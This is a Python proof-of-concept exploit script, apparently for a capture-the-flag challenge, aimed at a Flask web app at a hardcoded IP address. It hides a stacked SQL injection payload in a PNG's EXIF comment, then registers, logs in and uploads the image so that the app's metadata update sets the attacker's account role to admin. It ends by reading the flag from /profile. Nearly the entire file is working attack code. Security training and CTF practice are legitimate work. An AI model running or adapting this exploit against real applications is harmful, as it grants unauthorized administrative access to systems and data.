#!/usr/bin/env python3
"""
SQL Injection PoC - Privilege Escalation to Admin
Target: Flask application with EXIF metadata SQL injection

Steps:
1. Create malicious image with SQL injection in EXIF data
2. Register/login to the application
3. Upload the malicious image via /create endpoint
4. SQL injection executes, granting admin role
5. Access /profile to get the flag
"""

import requests
import subprocess
import os
from PIL import Image
import io

# Configuration
TARGET_URL = "http://52.77.233.125:10000/"  # Change to target URL
USERNAME = "ajkdnknsajn"
PASSWORD = "dasdsakjdas"

# Step 1: Create a simple image
def create_image():
    """Create a simple PNG image"""
    img = Image.new('RGB', (100, 100), color='red')
    img_bytes = io.BytesIO()
    img.save(img_bytes, format='PNG')
    img_bytes.seek(0)
    return img_bytes

# Step 2: Add malicious EXIF data
def create_malicious_image(username):
    """
    Create image with malicious EXIF data containing SQL injection
    
    The payload will close the existing SQL statement and inject a new one
    to change the user's role to admin
    """
    
    # Create base image
    img = Image.new('RGB', (100, 100), color='blue')
    temp_file = "malicious_image.png"
    img.save(temp_file)
    
    # SQL Injection payload
    # This will be inserted into: UPDATE posts SET metadata = '{payload}' WHERE id = {post_id};
    
    # Payload breaks out of the string and injects UPDATE statement
    sqli_payload = f"dummy'; UPDATE users SET role = 'admin' WHERE username = '{username}'; --"
    
    # Add malicious EXIF comment using exiftool
    try:
        cmd = [
            'exiftool',
            f'-Comment={sqli_payload}',
            '-overwrite_original',
            temp_file
        ]
        subprocess.run(cmd, check=True, capture_output=True)
        print(f"[+] Created malicious image with SQL injection payload")
        print(f"[+] Payload: {sqli_payload}")
        
        with open(temp_file, 'rb') as f:
            return f.read()
    except subprocess.CalledProcessError as e:
        print(f"[-] Error creating malicious image: {e}")
        print("[!] Make sure exiftool is installed: apt-get install libimage-exiftool-perl")
        return None
    finally:
        if os.path.exists(temp_file):
            os.remove(temp_file)

# Step 3: Register user
def register(session, username, password):
    """Register a new user account"""
    print(f"\n[*] Registering user: {username}")
    
    data = {
        'username': username,
        'password': password
    }
    
    resp = session.post(f"{TARGET_URL}/register", data=data, allow_redirects=False)
    
    if resp.status_code in [200, 302]:
        print(f"[+] Registration successful")
        return True
    else:
        print(f"[-] Registration failed: {resp.status_code}")
        return False

# Step 4: Login
def login(session, username, password):
    """Login to the application"""
    print(f"\n[*] Logging in as: {username}")
    
    data = {
        'username': username,
        'password': password
    }
    
    resp = session.post(f"{TARGET_URL}/login", data=data, allow_redirects=True)
    
    if 'Logged in' in resp.text or resp.url.endswith('/'):
        print(f"[+] Login successful")
        return True
    else:
        print(f"[-] Login failed")
        return False

# Step 5: Upload malicious image
def exploit(session, username):
    """Upload malicious image to trigger SQL injection"""
    print(f"\n[*] Creating and uploading malicious image...")
    
    malicious_img = create_malicious_image(username)
    
    if not malicious_img:
        return False
    
    files = {
        'image': ('exploit.png', malicious_img, 'image/png')
    }
    
    data = {
        'title': 'Test Post',
        'content': 'Testing SQL injection'
    }
    
    resp = session.post(f"{TARGET_URL}/create", files=files, data=data, allow_redirects=True)
    
    if resp.status_code == 200:
        print(f"[+] Image uploaded successfully")
        print(f"[+] SQL injection should have executed!")
        return True
    else:
        print(f"[-] Upload failed: {resp.status_code}")
        return False

# Step 6: Check if we're admin and get flag
def check_admin(session):
    """Check if we have admin role and retrieve flag"""
    print(f"\n[*] Checking admin access...")
    
    resp = session.get(f"{TARGET_URL}/profile")
    
    if 'flag{' in resp.text or 'FLAG{' in resp.text:
        print(f"[+] SUCCESS! We are admin!")
        print(f"[+] Flag retrieved:")
        
        # Extract flag from response
        import re
        flag_match = re.search(r'flag\{[^}]+\}|FLAG\{[^}]+\}', resp.text, re.IGNORECASE)
        if flag_match:
            print(f"\n    {flag_match.group(0)}\n")
        return True
    elif 'role' in resp.text.lower() and 'admin' in resp.text.lower():
        print(f"[+] We are admin but flag not found in response")
        return True
    else:
        print(f"[-] Not admin yet or exploit failed")
        return False

def main():
    """Main exploitation function"""
    print("="*60)
    print("SQL Injection PoC - Admin Privilege Escalation")
    print("="*60)
    
    session = requests.Session()
    
    # Step 1: Register
    if not register(session, USERNAME, PASSWORD):
        print("[!] Trying to login with existing credentials...")
    
    # Step 2: Login
    if not login(session, USERNAME, PASSWORD):
        print("[-] Exploit failed: Cannot login")
        return
    
    # Step 3: Exploit (upload malicious image)
    if not exploit(session, USERNAME):
        print("[-] Exploit failed: Cannot upload image")
        return
    
    # Step 4: Verify we're admin
    if check_admin(session):
        print("\n[+] Exploitation successful!")
    else:
        print("\n[-] Exploitation may have failed")
        print("[!] Try logging out and back in, then check /profile again")

if __name__ == "__main__":
    main()